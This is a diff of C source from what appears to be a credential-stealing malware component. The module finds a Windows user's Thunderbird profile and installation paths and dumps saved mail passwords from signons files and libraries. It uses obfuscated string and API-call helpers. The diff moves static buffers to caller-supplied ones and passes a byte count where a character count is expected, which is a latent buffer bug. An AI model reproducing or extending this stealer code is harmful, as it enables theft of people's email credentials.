@@ -20,7 +20,7 @@ extern int DumpSqlFF(WCHAR *profilePath, WCHAR *signonFile);
 extern WCHAR *DeobStringW(WCHAR *string);
 
 // Function declarations..
-WCHAR *GetTBProfilePath();
+WCHAR *GetTBProfilePath(WCHAR *FullPath, size_t size);
 
 #define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);
 
@@ -51,7 +51,7 @@ int Decrypt(CHAR *cryptData, WCHAR *clearData, UINT clearSize)
 }
 
 
-int DumpTB(WCHAR *profilePath, WCHAR *signonFile)
+static int DumpTB(WCHAR *profilePath, WCHAR *signonFile)
 {
 	WCHAR signonFullFile[MAX_PATH];
 	char buffer[2048];
@@ -151,9 +151,8 @@ int DumpTB(WCHAR *profilePath, WCHAR *signonFile)
 	return 1;
 }
 
-WCHAR *GetTBLibPath()
+static WCHAR *GetTBLibPath(WCHAR *FullPath, size_t size)
 {
-	static WCHAR FullPath[MAX_PATH];
 	char regSubKey[]    = "Software\\Classes\\Thunderbird.Url.mailto\\shell\\open\\command";
 	char path[MAX_PATH];
 	char *p;
@@ -190,17 +189,16 @@ WCHAR *GetTBLibPath()
 	if (!p)
 		return NULL;
 
-	_snwprintf_s(FullPath, MAX_PATH, L"%S", p);		
+	_snwprintf_s(FullPath, size, _TRUNCATE, L"%S", p);		
 
 	return FullPath;
 }
 
-WCHAR *GetTBProfilePath()
+static WCHAR *GetTBProfilePath(WCHAR *FullPath, size_t size)
 {
 	WCHAR appPath[MAX_PATH];
 	WCHAR iniFile[MAX_PATH];
 	WCHAR profilePath[MAX_PATH];
-	static WCHAR FullPath[MAX_PATH];
 	
 	FNC(GetEnvironmentVariableW)(L"APPDATA", appPath, MAX_PATH);
 
@@ -208,7 +206,7 @@ WCHAR *GetTBProfilePath()
    
 	FNC(GetPrivateProfileStringW)(L"Profile0", L"Path", L"",  profilePath, sizeof(profilePath), iniFile);
 
-	_snwprintf_s(FullPath, MAX_PATH, L"%s\\Thunderbird\\%s", appPath, profilePath);
+	_snwprintf_s(FullPath, size, _TRUNCATE, L"%s\\Thunderbird\\%s", appPath, profilePath);
 
 	return FullPath;
 }
@@ -216,21 +214,21 @@ WCHAR *GetTBProfilePath()
 
 int DumpThunderbird(void)
 {
-	WCHAR *ProfilePath = NULL; 	//Profile path
-	WCHAR *TBDir = NULL;   		//Thunderbird main installation path
+	WCHAR ProfilePath[MAX_PATH] = {} ; 	//Profile path
+	WCHAR TBDir[MAX_PATH] = {};   		//Thunderbird main installation path
 
-	ProfilePath = GetTBProfilePath();
+	GetTBProfilePath(ProfilePath, sizeof(ProfilePath));
 
-	if (!ProfilePath || !DirectoryExists(ProfilePath)) 
+	if (!DirectoryExists(ProfilePath)) 
 		return 0;
 
 	// get the password for the old versions
 	DumpTB(ProfilePath, L"signons.txt");   
 
 	// get the password for the 3.1.x
-	TBDir = GetTBLibPath();
+	GetTBLibPath(TBDir, sizeof(TBDir));
 
-	if (!TBDir || !DirectoryExists(TBDir)) 
+	if (!DirectoryExists(TBDir)) 
 		return 0;
 
 	if (!InitFFLibs(TBDir))	
